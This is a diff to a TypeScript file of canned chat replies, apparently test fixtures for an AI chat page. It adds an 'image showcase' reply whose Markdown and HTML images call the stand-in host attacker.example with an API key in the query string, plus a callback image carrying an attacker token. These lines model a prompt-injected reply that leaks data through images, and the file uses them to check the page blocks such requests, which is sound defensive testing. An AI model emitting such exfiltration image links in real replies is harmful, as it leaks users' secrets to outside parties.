@@ -270,6 +270,21 @@ export const cannedResponses: readonly string[] = [
     "Let me know if you'd like a deeper dive into any specific area.",
 ];
 
+/** The host the image showcase's remote images name, which the page must never request. */
+export const IMAGE_SHOWCASE_REMOTE_HOST = "attacker.example";
+
+/**
+ * The reply to a message starting with "images": a reply steered into
+ * carrying what it knows out in image URLs, as Markdown and as raw HTML, beside
+ * an image the page may show (a `data:` URI) and one that names a hub route.
+ */
+export const imageShowcase: string =
+  "# Image check\n\n" +
+  `![tracker](https://${IMAGE_SHOWCASE_REMOTE_HOST}/pixel.png?d=the-api-key)\n\n` +
+  `<img src="https://${IMAGE_SHOWCASE_REMOTE_HOST}/raw.png?d=the-api-key" alt="raw">\n\n` +
+  "![sign in](/cloud/callback?token=attacker)\n\n" +
+  "![dot](data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==)";
+
 /**
  * The reply to a message starting with "markdown": every Markdown shape a
  * reply can take that the page has to fit, with a table too wide for a phone
